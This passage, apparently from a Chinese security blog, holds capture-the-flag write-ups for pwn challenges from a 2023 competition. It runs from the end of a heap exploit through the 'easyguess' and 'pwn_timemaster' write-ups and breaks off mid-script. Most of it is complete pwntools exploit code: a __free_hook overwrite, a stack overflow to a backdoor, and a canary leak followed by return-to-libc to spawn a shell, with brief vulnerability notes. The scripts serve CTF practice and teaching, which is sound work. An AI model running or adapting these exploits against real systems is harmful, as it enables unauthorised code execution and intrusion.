class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pipeline1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x188A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">index,offset,size</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(offset) == <span class="built_in">int</span>:</span><br><span class="line">        sla(<span class="string">&quot;offset: &quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;offset: &quot;</span>,offset)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(size) == <span class="built_in">int</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(size) == <span class="built_in">int</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,size)</span><br><span class="line">    sla(<span class="string">&quot;data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add()<span class="comment">#0</span></span><br><span class="line">add()<span class="comment">#1</span></span><br><span class="line">add()<span class="comment">#2</span></span><br><span class="line">add()<span class="comment">#3</span></span><br><span class="line">add()<span class="comment">#4</span></span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add()<span class="comment">#5</span></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x460</span>)</span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ebfe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0x430</span>)</span><br><span class="line">add2(<span class="number">4</span>,<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x7d0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add()<span class="comment">#6</span></span><br><span class="line">add2(<span class="number">6</span>,<span class="number">0</span>,<span class="number">0x3f0</span>)</span><br><span class="line">add2(<span class="number">5</span>,<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add()<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x108</span>+p64(<span class="number">0x21</span>)+p64(free_hook-<span class="number">0x8</span>)+p64(<span class="number">0x50000000000</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&quot;-2147483136&quot;</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> + p64(system)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x20</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/28/CIVC%E8%BD%A6%E8%81%94%E7%BD%912023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/28/CIVC%E8%BD%A6%E8%81%94%E7%BD%912023/" class="post-title-link" itemprop="url">CIVC车联网2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-28 22:13:40 / Modified: 22:16:26" itemprop="dateCreated datePublished" datetime="2023-06-28T22:13:40+08:00">2023-06-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="easyguess"><a href="#easyguess" class="headerlink" title="easyguess"></a>easyguess</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">easyguess: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">82</span>ca2e649768e48e033662e11193e6e486b37089, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>32位，dynamically，NX</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>获取随机数后打栈溢出</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&#x27;./easyguess&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x08048594\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">back_door = <span class="number">0x804867A</span></span><br><span class="line">binsh_addr = <span class="number">0x8049A30</span> </span><br><span class="line">pop_edi_pop_ebp_ret = <span class="number">0x080486fa</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;You have three times&quot;</span>,<span class="built_in">str</span>(libc.rand()))</span><br><span class="line">sl(<span class="built_in">str</span>(libc.rand()))</span><br><span class="line">sl(<span class="built_in">str</span>(libc.rand()))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">24</span> +<span class="string">&quot;b&quot;</span>*<span class="number">8</span>  + p32(back_door) +p32(binsh_addr)</span><br><span class="line">sla(<span class="string">&quot;to pwn it!&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="pwn-timemaster"><a href="#pwn-timemaster" class="headerlink" title="pwn_timemaster"></a>pwn_timemaster</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter ./tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>_amd64/ld<span class="number">-2.31</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">671697b</span>357d39525a86658e92e5aa52b783012ff, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x3ff000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>有栈溢出，需要泄露 canary：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 <span class="title">ask_again</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Play again? (Y/n) &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v1);                     <span class="comment">// 栈溢出</span></span><br><span class="line">  readuntil(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v1[<span class="number">0</span>] != <span class="string">&#x27;n&#x27;</span> &amp;&amp; v1[<span class="number">0</span>] != <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Time[sec]: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%lf&quot;</span>, a1);</span><br></pre></td></tr></table></figure>
<p>函数 <code>scanf</code> 可能会因为格式不同而写入失败，导致 <code>time</code> 不会被初始化</p>
<p>通过前面的函数可以调节栈指针，使局部变量 <code>time</code> 正好指向 canary：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk = alloca(<span class="number">0x10</span> * ((<span class="number">8</span> * time + <span class="number">0x1E</span>) / <span class="number">0x10</span>));</span><br></pre></td></tr></table></figure>
<p>这样就会导致 canary 被泄露出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ask_time(&amp;time);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stop the timer as close to %lf seconds as possible!\n&quot;</span>, time);</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：这里是以 double 类型泄露的，当时想现写一个函数用于“转义”，可能是中间的步骤写错了导致出来的数据很乱（浪费了不少时间）</li>
</ul>
<p>后来看学弟用 <code>struct.pack</code> + <code>binascii.hexlify</code> 来处理数据，效果很好：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">leak_addr = ru(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">leak_addr = struct.pack(<span class="string">&quot;&lt;d&quot;</span>, <span class="built_in">float</span>(leak_addr))</span><br><span class="line">leak_addr = <span class="built_in">str</span>(binascii.hexlify(leak_addr)[::-<span class="number">1</span>])</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+leak_addr)</span><br></pre></td></tr></table></figure>
<p>最后的操作就比较朴素了，用 puts 来泄露 libc_base，写入并执行 <code>ask_again</code> 然后劫持返回地址为 system</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x4008DB\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;1&quot;</span></span><br><span class="line">times = <span class="number">16</span></span><br><span class="line">sla(<span class="string">&quot;What is your name?\n&gt; &quot;</span>,name)</span><br><span class="line">sla(<span class="string">&quot;How many times do you want to try?\n&gt; &quot;</span>,<span class="built_in">str</span>(times))</span><br><span class="line">sla(<span class="string">&quot;Time[sec]: &quot;</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Stop the timer as close to &quot;</span>)</span><br><span class="line">leak_addr = ru(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">leak_addr = struct.pack(<span class="string">&quot;&lt;d&quot;</span>, <span class="built_in">float</span>(leak_addr))</span><br><span class="line">leak_addr = <span class="built_in">str</span>(binascii.hexlify(leak_addr)[::-<span class="number">1</span>])</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+leak_addr)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span 